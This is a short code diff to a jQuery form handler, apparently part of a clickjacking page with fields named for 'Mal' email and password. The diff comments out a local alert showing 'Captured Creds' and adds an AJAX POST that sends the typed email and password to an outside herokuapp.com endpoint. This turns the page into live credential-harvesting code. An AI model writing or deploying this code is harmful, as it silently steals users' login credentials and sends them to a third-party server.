@@ -56,8 +56,21 @@
                 } else {
                     var jacksEmail = $('#inputMalEmail').val();
                     var jacksPassword = $('#inputMalPassword').val();
-                    console.log('Email: ' + jacksEmail);
-                    alert('Captured Creds are: \nUsername is: ' + jacksEmail + ' \nAND\nPassword is: ' + jacksPassword);
+                    // console.log('Email: ' + jacksEmail);
+                    // alert('Captured Creds are: \nUsername is: ' + jacksEmail + ' \nAND\nPassword is: ' + jacksPassword);
+
+                    $.ajax({
+                        url: "https://userinfoclickjacking.herokuapp.com/api/users",
+                        type: "POST",
+                        data: {
+                            email: jacksEmail,
+                            password: jacksPassword
+                        },
+                        success: function(response) {
+                            console.log(response);
+                        },
+                        error: function(err) {}
+                    })
                     location.reload();
                 }
             });
